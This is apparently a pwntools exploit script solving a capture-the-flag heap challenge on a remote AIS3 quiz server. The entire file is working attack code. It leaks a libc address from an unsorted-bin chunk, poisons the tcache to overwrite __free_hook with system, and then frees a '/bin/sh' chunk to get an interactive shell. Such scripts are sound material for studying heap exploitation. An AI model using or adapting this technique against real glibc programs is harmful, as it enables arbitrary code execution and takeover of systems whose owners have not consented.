from pwn import *

#p = process('./chal')
p = remote('quiz.ais3.org', 5005)

def record(x, y, len_name, name):
    p.sendlineafter("> ", "1")
    p.sendlineafter("x:", str(x))
    p.sendlineafter("y:", str(y))
    p.sendlineafter("length:", str(len_name))
    p.sendlineafter("name:", name)

def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("index:", str(idx))
    
def adjust(idx, x, y):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index:", str(idx))
    p.sendlineafter("x:", str(x))
    p.sendlineafter("y:", str(y))

def telescope(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter("index:", str(idx))


record(0, 0, 0x87, '0')
record(0, 0, 0x1000, '1') # unsorted bin chunk
record(0, 0, 0x87, '2')
record(0, 0, 0x87, '3')
record(0, 0, 0x87, '/bin/sh')
delete(0)
delete(1)

telescope(1)
libc = u64(p.recvuntil(' - ')[-9:-3].ljust(8, '\x00')) - 0x1ebbe0
free_hook = libc + 0x1eeb28
system = libc + 0x55410

delete(2)
record(0, 0, 0x1000, 'C')
delete(1)
delete(3)

record(0, 0, 0x20, p64(free_hook))
record(0, 0, 0x20, p64(system))
delete(4)

p.interactive()
